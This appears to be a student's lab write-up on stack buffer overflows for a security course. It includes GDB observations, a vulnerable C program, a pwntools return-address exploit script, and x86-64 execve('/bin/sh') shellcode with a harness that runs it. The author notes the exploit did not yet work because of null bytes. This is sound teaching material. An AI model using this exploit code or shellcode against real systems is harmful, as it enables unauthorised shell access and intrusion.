## Task 1

### Task 1.A.1

The _rip_ register is the instruction pointer register and it automatically stores the memory address of the next instruction once the an instruction is fetched and executed. This helps the program to be executed sequentially. 

The _RET_ intruction is used to return the program control to a return address on the top of the stack. The program control is returned from a subroutine such as function or procedure, to the calling code of the stack before the function was executed. 

When there are more inputs in the buffer than the data that it's supposed to hold, the adjacent memory locations can be overwritten including the return address of the call stack. The _RET_ instruction execution can lead to a memory location with an address of an attacker's choice which could be a malicious code. 

### Task 1.A.2

The buffer overflow occurs in the **line 7** if the _strcpy_ keeps writing the data from _string_ to _buffer_. This can occur if the user inputs a string longer than _buffer[20]_ which is  characters. The _strcpy_ should be edited in order to validate the length of the user input and also the null terminator in the string.

### Task 1.A.3

The codes are emulated to 64-bit system. 

Info breakpoint:
![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/a8e0eac9-f183-4df4-a7d5-09c51c3e0299)

The _helloworld_ has stored in ```0x7fffffffdd80```. The hexadecimal format of _helloworld_ is ```68 65 6c 6c 6f 77 6f 72 6c 64```. 
![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/f79ca262-b361-40f6-acb4-a27406b3fe5c)

The _RIP_ value is overwritten once the number of charcters exceeds 24. The commandline input is _helloworldhelloworldhello_ which having 25 charactors. 
Padding size = 24
![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/53945dba-5698-4aee-b22b-1653c25b6edd)

## Task 1.B

Breakpoint:

![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/73d660c5-c401-419f-834e-72d14bfbc643)

_RSP_:

![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/5c8bbaf2-1148-43c5-a1cc-29fd4039360f)

By inserting the 24 charctors of 'A', the _rax_ which means the function's return value has been changed to ASCII value of 'BBBBBBBB'.

![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/8bedc1e9-028c-4e3c-9a10-1dc60172bc80)

The new code:
```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void target_function() {
    printf("Exploited! You have control!\n");
    system("/bin/sh");    
}

void stackoverflow(char* payload) {
    char buffer[20];
    strcpy(buffer, payload); 
    printf("%s\n", buffer);
    return;
}

int main(int argc, char** argv) {
    printf("Starting the vulnerable program...\n");
    stackoverflow(argv[1]);
    printf("Program continues...\n");
    return 0;
}
```

The address was changed into the new function location. But having null bytes in the address alters the return value from ```0x0000555555555169```. 

![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/ea2c603a-7983-4b90-b049-c32c1781d9a0)

I couldn't find a solution for above issue yet. 

 

## Task 1.C

The code was altered in order to work in 64-bit. 

```python
from pwn import *
context.update(arch='amd64', os='linux', endian='little', word_size=64)
context.binary="./overflow"

def main():
    # Our beloved target binary
    # Note that this generates virtual address space
    task_bin = ELF('./overflow')
    # Payload to be passed into the program
    PADDING_SIZE = 24
    payload = b"A" * PADDING_SIZE
    # Get address of the function automatically!
    # What are symbols of the compiled program?
    secret = task_bin.symbols['target_function']
    # 'I' means unsigned as integer, convert integer to hexbytes with correct alignment
    # payload += struct.pack('I', secret)

    payload += struct.pack('Q', secret)    
    print(f'Secret address {hex(secret)}')
    p = task_bin.process(argv=[payload])
    print(p.recvall().decode("utf-8", "ignore"))
    # p.interactive() # if your function spawns a shell

if __name__ == "__main__":
    main()
```

The output appears as below.

![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/09af7624-6769-47f2-b6c4-c9fb3afab3b6)

I haven't got time to fix the error. The same issue in task 1.b has appeard here.

# Task 2

## Task 2.A

Machine code:

![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/1f8d38b9-8395-40e7-a935-c6ffe9cd4c52)

The ```.asm``` code for 64-bit system. 

```asm
section .text
global _start

_start:

; Zero out RAX
xor rax, rax

; Push null-terminated "/bin/sh" string onto the stack
push rax
mov rbx, 0x68732f6e69622f2f ; "/bin/sh" in reverse order
push rbx

; Move the address of the string to RDI (first argument for execve)
mov rdi, rsp

; Zero out RDX and RSI (null-terminate the argument list)
xor rdx, rdx
xor rsi, rsi

; Set syscall number for execve (59) in RAX
mov al, 59

; Call syscall
syscall
```

The machine code after eliminating null bytes. 

![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/e3836980-24d5-4c5d-ac2f-8fb06994b90c)

Shellcode array: ```shellcode[] = "\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05";```

Test program:
```c
#include<stdio.h>
#include<string.h>

void main()
{
    char shellcode[] = "\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05";
    void(*fp) (void);
    fp = (void *)&shellcode;
    fp();
}
```

Output:

![image](https://github.com/SoftwareHardwareSecurity-2023/software-and-hardware-security-submissions-PiyumiUoR/assets/53691448/dbc2608a-b697-4d11-9b36-34758d21502a)

## Task 2.B
